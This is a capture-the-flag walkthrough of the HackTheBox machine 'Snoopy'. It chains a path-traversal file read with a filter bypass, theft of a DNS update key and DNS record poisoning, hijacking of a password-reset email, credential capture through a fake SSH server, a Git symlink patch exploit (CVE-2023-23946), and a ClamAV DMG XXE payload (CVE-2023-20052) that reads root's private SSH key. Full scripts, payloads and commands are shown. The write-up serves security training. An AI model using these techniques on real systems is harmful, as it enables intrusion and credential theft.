
---
`#hackthebox` `#linux` `#hard` `#cve-2023-23946` `#cve-2023-20052` `#lfi` `#dns-poisoning` `#xxe`
platform: HackTheBox
difficulty: Hard
status: completed

---

# HTB: Snoopy – Full Chain Walkthrough

![](images/0snoopy_ico.png)

| **Box Info**   |               |
| -------------- | ------------- |
| **Name**       | Snoopy        |
| **Platform**   | HackTheBox    |
| **Difficulty** | Hard          |
| **Date**       | 6th May, 2023 |
| **OS**         | Linux         |
| **Status**     | Retired       |

## Synopsis

This machine was compromised by chaining a web parameter discovery leading to a file read vulnerability, which exposed DNS configuration secrets. These secrets were used to poison the DNS zone, allowing the interception of password reset emails for a Mattermost instance. Internal access was gained via a captured SSH credential triggered by a Mattermost slash command.

After doing some research on Google, we came across a vulnerability disclosure addressing two separate issues within `git apply` in versions prior to 2.39.2 which, when chained, can cause privilege escalation. This allowed lateral movement to another user.

Finally, we leveraged a ClamAV vulnerability. Clamscan is a tool by ClamAV, which is an antivirus software for Linux distributions. It can scan the contents of files and flag potential harm. We performed research on ClamAV vulnerabilities and found CVE-2023-20052, which explains that ClamAV's DMG file parser contains an information leak via XML External Entity (XXE) infiltration. To exploit this we needed to understand how to create DMG files. This led to reading the root SSH private key and full compromise.

## Recon

### Network Scanning

The attack began by connecting to the VPN and scanning the target IP address `10.129.229.5` to identify open ports.

```bash
┌──(copyN1nja㉿kali)-[~]
└─$ sudo nmap 10.129.229.5 -T5 -Pn --disable-arp-ping -p- --open

# Nmap 7.94SVN scan initiated Mon Mar 30 04:49:59 2026 as: nmap -T5 -Pn -sV -sC -A --disable-arp-ping -oA snoopy 10.129.229.5
Warning: 10.129.229.5 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.229.5
Host is up (0.41s latency).
Not shown: 937 closed tcp ports (reset), 60 filtered tcp ports (no-response)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ee:6b:ce:c5:b6:e3:fa:1b:97:c0:3d:5f:e3:f1:a1:6e (ECDSA)
|_  256 54:59:41:e1:71:9a:1a:87:9c:1e:99:50:59:bf:e5:ba (ED25519)
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
Device type: general purpose
Running (JUST GUESSING): Linux 5.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:5.0
Aggressive OS guesses: Linux 5.0 (85%), Linux 5.0 - 5.4 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   700.59 ms 10.10.14.1
2   700.71 ms 10.129.229.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 30 04:51:17 2026 -- 1 IP address (1 host up) scanned in 78.33 seconds
```

### Website Enumeration

Visiting port 80 displays **SnoopySec**, a security firm.

![](images/1snoopySec.jpeg)

On the **Teams** page, we find various usernames all using the domain `snoopy.htb`.

![](images/2snoopySec_team.png)

The root page has links `/download` and `/download?file=announcement.pdf`. Both download a ZIP file named `press_release.zip`. Inspecting with BurpSuite, the second link includes a file `announcement.pdf` controlled by the `file` parameter.

![](images/3snoopySec_download.png)

Visiting the **Contact** section, a notice is displayed at the top:

```text
Attention: As we migrate DNS records to our new domain please be advised that our mailserver ‘mail.snoopy.htb’ is currently offline.
```

There is also a form, but submitting it returns an error:

```text
Unable to load the "PHP Email form" Library!
```

![](images/4snoopySec_contact.png)

### DNS Enumeration

Since port 53 is open, a zone transfer is attempted:

```bash
┌──(copyN1nja㉿kali)-[~]
└─$ dig axfr @10.10.11.212 snoopy.htb

snoopy.htb.          86400  IN  SOA   ns1.snoopy.htb. ns2.snoopy.htb. ...
snoopy.htb.          86400  IN  NS    ns1.snoopy.htb.
snoopy.htb.          86400  IN  NS    ns2.snoopy.htb.
mattermost.snoopy.htb. 86400 IN A    172.18.0.3
mm.snoopy.htb.       86400  IN  A    127.0.0.1
postgres.snoopy.htb. 86400  IN  A    172.18.0.2
provisions.snoopy.htb. 86400 IN A    172.18.0.4
www.snoopy.htb.      86400  IN  A    172.18.0.5
```

Notice `mail.snoopy.htb` is missing – confirming the DNS maintenance notice.

All discovered subdomains are added to `/etc/hosts`. Browsing each reveals that `mm.snoopy.htb` hosts a **Mattermost** instance.

![](images/6snoopy_mattermost.jpeg)

The **Forgot your password?** link provides a form. Entering one of the emails from the Teams page returns an error about sending the password reset email – likely due to the mailserver DNS issue.


## LFI to DNS Secrets

The `download?file=` parameter downloads a ZIP archive. Testing `download?file=../../../../../etc/passwd` returns no content – directory traversal with `../` is blocked. Replacing `../` with `....//` bypasses the filter.

**Payload:** `download?file=....//....//....//....//....//etc/passwd`

![](images/10snoopy.png)

### LFI Automation Script

The following Bash script reads a wordlist (`lfi_wordlist.txt`), issues a `curl` request for each target, saves the response as a numbered ZIP, extracts it, and copies the target file to the working directory.

```bash
#!/bin/bash
WORDLIST="lfi_wordlist.txt"
URL_BASE="http://snoopy.htb/download?file=....//....//....//....//....//"
TEMP_DIR="temp_lfi"

mkdir -p "$TEMP_DIR"

counter=1

while IFS= read -r target; do
    [ -z "$target" ] && continue

    echo "[*] Trying: $target"

    curl -s -f -L -o "${counter}.zip" "${URL_BASE}${target}"

    if [ ! -s "${counter}.zip" ]; then
        echo "    [-] Failed or empty response, skipping."
        rm -f "${counter}.zip"
        ((counter++))
        continue
    fi

    unzip -q "${counter}.zip" -d "$TEMP_DIR"

    extracted_file=$(find "$TEMP_DIR" -type f -name "$(basename "$target")" 2>/dev/null | head -n1)

    if [ -n "$extracted_file" ]; then
        cp "$extracted_file" "$PWD/${counter}_$(basename "$target" | tr '/' '_')"
        echo "    [+] Copied: $extracted_file -> $PWD/${counter}_$(basename "$target" | tr '/' '_')"
    else
        echo "    [-] Target file not found in extracted ZIP."
    fi

    rm -f "${counter}.zip"
    rm -rf "$TEMP_DIR"/*
    ((counter++))
done < "$WORDLIST"

rmdir "$TEMP_DIR" 2>/dev/null

echo "[*] Done. Extracted files are in $PWD"
```


##### Running the bash script  with a prepared wordlist

![](images/11snoopy_term.png)

![](images/12snoopy.png)
### Extracting rndc.key

Using the LFI, read the BIND configuration files and extract the `rndc.key`:

![](images/13snoopy.png)


## DNS Poisoning

Create a key file and update the DNS record for `mail.snoopy.htb` to point to the attacker's IP (`10.10.15.60`):

```bash
┌──(copyN1nja㉿kali)-[~]
└─$ cat > rndc.key << 'EOF'
key "rndc-key" {
    algorithm hmac-md5;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
EOF

┌──(copyN1nja㉿kali)-[~]
└─$ nsupdate -k rndc.key << 'EOF'
server 10.129.229.5
zone snoopy.htb
update add mail.snoopy.htb 60 A 10.10.15.60
send
quit
EOF
```

Good, no output means success.

## Password Reset & SMTP Sink

Set up a Python SMTP server to catch the password reset email and proceed to triggering a password reset for `sbrown@snoopy.htb` via Mattermost

```bash
┌──(venv)─(kali㉿kali)-[~/snoopy]
└─$ python3 -m aiosmtpd -n -l 0.0.0.0:25

---------- MESSAGE FOLLOWS ----------
mail options: ['BODY=8BITMIME']

MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
Auto-Submitted: auto-generated
Precedence: bulk
Reply-To: "No-Reply" <no-reply@snoopy.htb>
From: "No-Reply" <no-reply@snoopy.htb>
Date: Sun, 05 Apr 2026 06:30:47 +0000
Message-ID: <x6qgcwpirek49e4z-1775370647@mm.snoopy.htb>
To: sbrown@snoopy.htb
Subject: [Mattermost] Reset your password
Content-Type: multipart/alternative;
 boundary=e585b81187eeec35bc08e0de2b6f07e67f801c4b1564a716975aaa6631f6
X-Peer: ('10.129.15.4', 36916)

--e585b81187eeec35bc08e0de2b6f07e67f801c4b1564a716975aaa6631f6
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset=UTF-8

Reset Your Password
Click the button below to reset your password. If you didn=E2=80=99t reques=
t this, you can safely ignore this email.

Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3Djy55s=
xtr5xgthnxse6ojdpsa9wh6nkrtffq46aaiygsempmwexuhuhj8gckficsn )

<snip>
```

The link has some extra encoding in it that’s handled by SMTP. `=` is used in SMTP to represent the end of a line. So `=3D` is the Quoted printable encoding that represents an actual equals sign.

[This site](https://www.webatic.com/quoted-printable-convertor) will decode it for you . Giving `http://mm.snoopy.htb/reset_password_complete?token=jy55sxtr5xgthnxse6ojdpsa9wh6nkrtffq46aaiygsempmwexuhuhj8gckficsn`

 Visit the link, set a new password for `sbrown`, and gain access to Mattermost.

![](images/14snoopy.jpeg)



## Mattermost Exploration

Inside Mattermost, the **Town Square** channel contains important messages

- First, there are messages about server provisioning:

![](images/15snoopy.jpeg)

- And then, they talk about Antivirus called *ClamAV*

![](images/16snoopy.jpeg)

Searching for *Server* in the channel search box, reveals the `Server Provisioning Channel`. It's empty and anyone can join

### Slash Commands

Typing `/` reveals all available commands. One command opens a dialog asking for an **Operating System** and an **IP address**.

![](images/19snoopy.jpeg)

Enter the attacker's IP and start a netcat listener on port 2222:

![](images/20snoopy.png)

```bash
┌──(copyN1nja㉿kali)-[~]
└─$ nc -lnvp 2222
Listening on 0.0.0.0 2222
Connection received on 10.10.11.212 55630
SSH-2.0-paramiko_3.1.0
```

The command attempts to SSH into the given IP for provisioning.

## SSH Honeypot

We can use a Go SSh-honeyPot on  [github]( https://github.com/westenfelder/SSH-Log)  to set up ssh-honeypot quickly on port 22 with flag *-v* to enable logging credentials to stdout.

Before that,  set up `socat` to forward port 2222 to local port 22, and run an SSH honeypot to capture credentials.

```bash
┌──(copyN1nja㉿kali)-[~]
└─$ socat TCP4-LISTEN:2222,fork TCP4:localhost:22
```

![](images/21snoopy.png)

Captured credentials: `cbrown : sn00pedcr3dential!!!`

Log in as `cbrown`:

```bash
┌──(copyN1nja㉿kali)-[~]
└─$ ssh cbrown@10.129.229.5
```


## Privilege Escalation: cbrown → sbrown (CVE‑2023‑23946)

### Sudo Permissions

```bash
cbrown@snoopy:~$ sudo -l

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
```

### Generate SSH Key Pair

Before crafting the malicious patch, we generate a new SSH key pair. The public key will be written into `sbrown`'s `authorized_keys` file, allowing us to log in as `sbrown` using the corresponding private key.

```bash
┌──(copyN1nja㉿kali)-[~]
└─$ ssh-keygen -t rsa -b 4096 -f server -N ""
```


### Exploit Git Symlink Vulnerability

After doing some research on Google, we came across a [vulnerability disclosure](https://github.blog/2023-02-14-git-security-vulnerabilities-announced-3/) addressing two separate issues within `git apply` in versions prior to 2.39.2 which, when chained, can cause privilege escalation.

We can *exploit* in in the following way:

```bash
# Create a repository with a symlink to `sbrown`'s `.ssh` directory
cbrown@snoopy:~$ cd /tmp   
mkdir pwn-git-exploit
chmod 777 pwn-git-exploit
cd pwn-git-exploit
git init
ln -s /home/sbrown/.ssh target_link
git add target_link
git commit -m "add symlink"


 1 file changed, 1 insertion(+)
 create mode 120000 target_link
```

Craft the malicious patch:

```bash
cbrown@snoopy:/tmp/pwn-git-exploit$ cat > patch <<-EOF
diff --git a/target_link b/renamed_target
similarity index 100%
rename from target_link
rename to renamed_target
--
diff --git /dev/null b/renamed_target/authorized_keys
new file mode 100644
index 0000000..039727e
--- /dev/null
+++ b/renamed_target/authorized_keys
@@ -0,0 +1,1 @@
+${YOUR_KEY}
EOF
```

Apply the patch as `sbrown`:

```bash
cbrown@snoopy:/tmp/pwn-git-exploit$ sudo -u sbrown /usr/bin/git apply -v patch
Checking patch target_link => renamed_target...
Checking patch renamed_target/authorized_keys...
Applied patch target_link => renamed_target cleanly.
Applied patch renamed_target/authorized_keys cleanly.
```

Now SSH as `sbrown` using the corresponding private key.

![](images/23snoopy_user.png)


## Privilege Escalation: sbrown → root (CVE‑2023‑20052)

### Sudo Permissions

```bash
sbrown@snoopy:~$ sudo -l

User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
```

### Exploit ClamAV XXE Vulnerability

*Clamscan* is a tool by ClamAV, which is an antivirus software for Linux distributions. It can scan the contents of files and flag potential harm. We performed research on ClamAV vulnerabilities and found CVE-2023-20052, which explains that ClamAV's DMG file parser contains an information leak via XML External Entity (XXE) infiltration. To exploit this we needed to understand how to create DMG files.

 nokn0wthing has [this repo](https://github.com/nokn0wthing/CVE-2023-20052). A Docker container that will generate the DMG file for us

Following the instructions in the repo, we’ll clone it and build the container:

``` bash
git clone https://github.com/nokn0wthing/CVE-2023-20052.git
Cloning into 'CVE-2023-20052'...
remote: Enumerating objects: 15, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 15 (delta 4), reused 4 (delta 0), pack-reused 0
Receiving objects: 100% (15/15), 47.69 KiB | 2.17 MiB/s, done.
Resolving deltas: 100% (4/4), done.
oxdf@hacky$ cd CVE-2023-20052/
oxdf@hacky$ docker build -t cve-2023-20052 .
...[snip]...
```

we’ll drop into the container, mounting the current directory in as the `/exploit` directory:

``` bash
docker run -v $(pwd):/exploit -it cve-2023-20052 bash
```

The first step is to generate an ISO image. 

```bash
root@39e742dc1260:/exploit# genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img .
genisoimage: Warning: no Apple/Unix files will be decoded/mapped
Total translation table size: 0
Total rockridge attributes bytes: 6878
Total directory bytes: 36864
Path table size(bytes): 240
Max brk space used 1b000
181 extents written (0 MB)
```


Next we’ll turn that into a DMG:

```
root@39e742dc1260:/exploit# dmg dmg test.img test.dmg
Processing DDM...
No DDM! Just doing one huge blkx then...
run 0: sectors=512, left=724
run 1: sectors=212, left=212
Writing XML data...
Generating UDIF metadata...
Master checksum: ffac019f
Writing out UDIF resource file...
Cleaning up...
Done
```

Finally, we can use `bbe` (the [binary block editor](https://linux.die.net/man/1/bbe)) to edit in the XXE, modifying the command from GitHub to read root’s ssh key instead of `/etc/passwd`:

```bash
root@39e742dc1260:/exploit# bbe -e 's|<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">|<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa"> ]>|' -e 's/blkx/&xxe\;/' test.dmg -o exploit.dmg
```

Exit the container and copy `exploit.dmg` to Snoopy, then scan it as root:

```bash
sbrown@snoopy:~$ sudo clamscan --debug /home/sbrown/scanfiles/exploit.dmg
LibClamAV debug: searching for unrar, user-searchpath: /usr/local/lib
LibClamAV debug: unrar support loaded from /usr/local/lib/libclamunrar_iface.so.11.0.0
LibClamAV debug: Initialized 1.0.0 engine
LibClamAV debug: Initializing phishcheck module
...[snip]...
LibClamAV debug: Descriptor[3]: Continuing after file scan resulted with: No viruses detected
LibClamAV debug: in cli_scanscript()
LibClamAV debug: matcher_run: performing regex matching on full map: 0+3329(3329) >= 3329
LibClamAV debug: matcher_run: performing regex matching on full map: 0+3329(3329) >= 3329
LibClamAV debug: hashtab: Freeing hashset, elements: 0, capacity: 0
LibClamAV debug: hashtab: Freeing hashset, elements: 0, capacity: 0
LibClamAV debug: Descriptor[3]: Continuing after file scan resulted with: No viruses detected
LibClamAV debug: cli_magic_scan: returning 0  at line 4997
LibClamAV debug: clean_cache_add: 0bf7a447855c6e598fe480a4a46d4988 (level 0)
LibClamAV debug: cli_scandmg: wanted blkx, text value is -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth/iMUF6W2ogsW0KPFN8MffExz2G9D/
4gpYjIcyauPHSrV4fjNGM46AizDTQIoK6MyN4K8PNzYMaVnB6IMG9AVthEu11nYzoqHmBf
...[snip]...
```

### SSH as root

```bash
┌──(root㉿kali)-[/home/kali/snoopy]
└─# ssh -i root_rsa root@10.129.16.94

root@snoopy:~# cat /root/root.txt
cbe0d106ed77244fd9524b7c5ddfc324
```



## Flags Captured

| Flag | Path | Value |
|------|------|-------|
| User | `/home/sbrown/user.txt` | `f1790bcd...` |
| Root | `/root/root.txt` | `cbe0d106ed77244fd9524b7c5ddfc324` |

## Tools Used

- **Nmap** – Port scanning
- **BurpSuite** – Web parameter analysis
- **dig** – DNS zone transfer
- **curl / Bash** – LFI automation
- **nsupdate** – Dynamic DNS update
- **aiosmtpd** – SMTP sink
- **Mattermost** – Collaboration platform (target)
- **socat** – Port forwarding
- **SSH honeypot** – Credential capture
- **Git** – CVE‑2023‑23946 exploitation
- **ClamAV** – CVE‑2023‑20052 exploitation
- **Docker** – DMG generation environment

## References

- [CVE-2023-23946 – Git apply path traversal](https://nvd.nist.gov/vuln/detail/CVE-2023-23946)
- [CVE-2023-20052 – ClamAV XXE vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2023-20052)
- [nokn0wthing/CVE-2023-20052 – Docker DMG generator](https://github.com/nokn0wthing/CVE-2023-20052)
